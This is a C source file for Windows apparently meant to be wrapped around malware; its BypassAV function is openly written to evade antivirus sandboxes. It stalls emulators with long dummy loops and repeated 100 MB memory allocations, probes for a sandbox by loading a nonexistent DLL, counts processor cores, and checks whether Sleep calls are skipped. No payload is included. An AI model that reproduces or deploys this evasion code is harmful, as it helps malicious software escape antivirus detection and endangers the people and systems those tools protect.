#include <windows.h>


DWORD WINAPI BypassAV(LPVOID);
void HideWindow();
void Bunny();
void Hop1();
void Hop2();
void Hop3();
void Hop4();
void Hop5();


DWORD WINAPI BypassAV(LPVOID params){
	Bunny();// }=> Obfuscate the code with function calls and garbage memory allocations...


	HINSTANCE DLL = LoadLibrary(TEXT("fakeass.dll")); //}
	if(DLL != NULL){//								 |
		BypassAV(NULL);					//				 |=> Try to load a fake dll... 
	}//												 }




	SYSTEM_INFO SysGuide;//                         	}
	GetSystemInfo(&SysGuide);//							|
	int CoreNum = SysGuide.dwNumberOfProcessors;//		|
	if(CoreNum < 2){//									|=> Check the number of processor cores...
		BypassAV(NULL);					//					|
	}//													}



	//							     }
	int Tick = GetTickCount();     //| 
	Sleep(1000);			       //|
	int Tac = GetTickCount();      //|
	if((Tac - Tick) < 1000){   	   //|=> Check if the sleep function is skipped...
		BypassAV(NULL);				   //|
	}						       //|
	//							     }																


	Bunny();//}=> Obfuscate the code with function calls and garbage memory allocations...

	return true;
}



void Bunny(){

	double Max = 9999999;
	double Needle = 0;
	for(double i = 0; i < Max; i++){
		Needle++;
	}


	for(int i = 0; i < 8; i++){
		Hop1();
		Hop2();
		Hop3();
		Hop4();
		Start:;
		i++;
		Hop5();
		if((i % 3) == 0){
			goto Start;	
		}
		
	}

}



void Hop1(){

	char * Memdmp = NULL;
	Memdmp = (char *)malloc(100000000);
	if(Memdmp != NULL){
		memset(Memdmp, 00, 100000000);
		free(Memdmp);
	}
}
void Hop2(){


	char * Memdmp = NULL;
	Memdmp = (char *)malloc(100000000);
	if(Memdmp != NULL){
		memset(Memdmp, 00, 100000000);
		free(Memdmp);
	}
}
void Hop3(){


	char * Memdmp = NULL;
	Memdmp = (char *)malloc(100000000);
	if(Memdmp != NULL){
		memset(Memdmp, 00, 100000000);
		free(Memdmp);
	}
}
void Hop4(){

	char * Memdmp = NULL;
	Memdmp = (char *)malloc(100000000);
	if(Memdmp != NULL){
		memset(Memdmp, 00, 100000000);
		free(Memdmp);
	}
}
void Hop5(){



	char * Memdmp = NULL;
	Memdmp = (char *)malloc(100000000);
	if(Memdmp != NULL){
		memset(Memdmp, 00, 100000000);
		free(Memdmp);
	}
}


